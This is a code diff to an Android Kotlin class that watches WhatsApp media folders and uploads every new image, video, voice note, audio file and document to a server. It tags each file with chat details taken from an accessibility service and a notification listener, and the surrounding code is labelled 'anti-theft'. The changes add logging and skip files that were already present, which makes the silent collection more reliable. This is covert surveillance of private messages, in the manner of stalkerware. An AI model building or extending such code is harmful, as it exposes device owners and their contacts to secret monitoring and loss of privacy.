@@ -8,18 +8,6 @@ import java.io.File
 
 /**
  * Watches WhatsApp media folders and uploads newly created files to the server.
- *
- * Monitored folders:
- * - WhatsApp Images (received + Sent)
- * - WhatsApp Video (received + Sent)
- * - WhatsApp Voice Notes
- * - WhatsApp Audio
- * - WhatsApp Documents
- *
- * For Sent folders the media is tagged as outgoing and associated with the
- * current chat reported by ProtectAccessibilityService.
- * For received folders we try to associate it with the last incoming WhatsApp
- * notification address captured by WhatsAppNotificationListener.
  */
 class WhatsAppMediaObserver private constructor() {
 
@@ -30,6 +18,7 @@ class WhatsAppMediaObserver private constructor() {
     fun start() {
         stop()
         processedFiles.clear()
+        WhatsAppPaths.logResolvedPaths()
 
         val paths = listOf(
             Folder(WhatsAppPaths.WHATSAPP_IMAGES, "image", false),
@@ -44,23 +33,24 @@ class WhatsAppMediaObserver private constructor() {
         for (folder in paths) {
             val dir = File(folder.path)
             if (!dir.exists() || !dir.isDirectory) {
-                Log.d("WhatsAppMedia", "skipping non-existent folder: ${folder.path}")
+                Log.w("WhatsAppMedia", "Folder not found: ${folder.path}")
                 continue
             }
+
+            val filesBefore = dir.listFiles()?.map { it.name }?.toSet() ?: emptySet()
 
             val observer = object : FileObserver(dir, CREATE or MOVED_TO or CLOSE_WRITE) {
                 override fun onEvent(event: Int, path: String?) {
                     if (path.isNullOrBlank()) return
                     val file = File(dir, path)
-                    if (event == CREATE || event == MOVED_TO) {
-                        // Wait a bit for WhatsApp to finish writing the file
-                        handler.postDelayed({ handleFile(file, folder) }, 1200)
-                    }
+                    Log.d("WhatsAppMedia", "Event=${event} file=${file.absolutePath} exists=${file.exists()} size=${file.length()}")
+                    // Wait for WhatsApp to finish writing
+                    handler.postDelayed({ handleFile(file, folder, filesBefore) }, 2000)
                 }
             }
             observer.startWatching()
             observers.add(observer)
-            Log.d("WhatsAppMedia", "watching ${folder.path}")
+            Log.d("WhatsAppMedia", "Watching: ${folder.path} (${dir.listFiles()?.size ?: 0} files)")
         }
     }
 
@@ -69,13 +59,22 @@ class WhatsAppMediaObserver private constructor() {
         observers.clear()
     }
 
-    private fun handleFile(file: File, folder: Folder) {
-        if (!file.exists() || file.length() == 0L) return
+    private fun handleFile(file: File, folder: Folder, filesBefore: Set<String>) {
+        if (!file.exists() || file.length() == 0L) {
+            Log.d("WhatsAppMedia", "Skipping: ${file.name} (exists=${file.exists()}, size=${file.length()})")
+            return
+        }
+
+        // Skip files that existed before we started watching
+        if (filesBefore.contains(file.name)) {
+            Log.d("WhatsAppMedia", "Skipping existing file: ${file.name}")
+            return
+        }
+
         val key = "${file.absolutePath}:${file.lastModified()}"
         synchronized(processedFiles) {
             if (processedFiles.contains(key)) return
             processedFiles.add(key)
-            // Avoid unbounded growth
             if (processedFiles.size > 500) processedFiles.clear()
         }
 
@@ -87,7 +86,7 @@ class WhatsAppMediaObserver private constructor() {
             else -> "📎 Arquivo"
         }
 
-        Log.d("WhatsAppMedia", "detected ${folder.type} ${if (folder.isSent) "sent" else "received"}: ${file.name}")
+        Log.d("WhatsAppMedia", "Uploading ${folder.type} ${if (folder.isSent) "sent" else "received"}: ${file.name} (${file.length()} bytes) to chat: $address")
         AntiTheftService.uploadWhatsAppMedia(file, folder.type, folder.isSent, address, name, caption)
     }
 
